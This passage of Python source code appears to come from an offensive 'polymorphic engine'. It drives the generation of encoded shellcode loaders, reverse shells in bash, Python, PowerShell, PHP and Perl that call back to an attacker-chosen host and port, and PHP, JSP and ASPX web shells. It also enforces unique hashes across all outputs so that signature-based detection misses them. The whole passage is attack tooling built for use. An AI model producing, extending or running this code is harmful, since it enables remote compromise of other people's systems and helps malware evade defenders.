    def encode_shellcode_all(self, shellcode: bytes) -> List[PolyArtifact]:
        artifacts: List[PolyArtifact] = []
        # Encode once per scheme so the operator can pick
        for scheme in PolymorphicShellcodeEncoder.SCHEMES:
            pkg = self.shellcoder.encode(shellcode, scheme=scheme)
            for gen in (self.shellcoder.gen_c_decoder,
                         self.shellcoder.gen_py_decoder,
                         self.shellcoder.gen_cs_decoder):
                art = gen(pkg)
                self._save(art)
                artifacts.append(art)
        return artifacts

    def reverse_shells_all(self, lhost: str, lport: int) -> List[PolyArtifact]:
        out = [
            self.revsh.bash(lhost, lport),
            self.revsh.python(lhost, lport),
            self.revsh.powershell(lhost, lport),
            self.revsh.php(lhost, lport),
            self.revsh.perl(lhost, lport),
        ]
        for art in out:
            self._save(art)
        return out

    def web_shells_all(self, password: Optional[str] = None) -> List[PolyArtifact]:
        out = [
            self.webshell.php(password),
            self.webshell.jsp(password),
            self.webshell.aspx(password),
        ]
        for art in out:
            self._save(art)
        return out

    def _save(self, art: PolyArtifact) -> None:
        ext_map = {'c': 'c', 'python': 'py', 'csharp': 'cs',
                    'bash': 'sh', 'powershell': 'ps1', 'php': 'php',
                    'perl': 'pl', 'jsp': 'jsp', 'aspx': 'aspx'}
        ext = ext_map.get(art.language, 'txt')
        fname = f'{art.kind}_{art.language}_{art.sha256[:12]}.{ext}'
        path = os.path.join(self.out_dir, fname)
        art.write(path)
        self.results['artifacts'].append({
            'path': path, 'kind': art.kind, 'language': art.language,
            'sha256': art.sha256, 'metadata': art.metadata,
        })

    def run_full_generation(self, lhost: str = '10.10.14.5', lport: int = 4444,
                              shellcode: Optional[bytes] = None,
                              webshell_password: Optional[str] = None) -> Dict[str, Any]:
        if shellcode is None:
            shellcode = b'\x90' * 32 + b'\xCC'   # NOP-sled + INT3 placeholder
        print(f'[POLY] Generating polymorphic loaders ({len(shellcode)}B shellcode)…')
        self.encode_shellcode_all(shellcode)
        print(f'[POLY] Generating reverse shells for {lhost}:{lport}…')
        self.reverse_shells_all(lhost, lport)
        print(f'[POLY] Generating web shells (auth: '
              f'{webshell_password or "auto-generated"})…')
        self.web_shells_all(webshell_password)
        self.results['completed_at'] = datetime.now().isoformat()
        print(f'[✓] Generated {len(self.results["artifacts"])} unique artifacts in {self.out_dir}')
        # Verify uniqueness invariant
        hashes = [a['sha256'] for a in self.results['artifacts']]
        assert len(hashes) == len(set(hashes)), \
            'polymorphism invariant broken — duplicate artifacts produced'
        return self.results


if __name__ == '__main__':
    import sys
    e = PolymorphicEngine()
    out = e.run_full_generation(
        lhost=sys.argv[1] if len(sys.argv) > 1 else '10.10.14.5',
        lport=int(sys.argv[2]) if len(sys.argv) > 2 else 4444,
    )
    print(f'Generated {len(out["artifacts"])} artifacts')
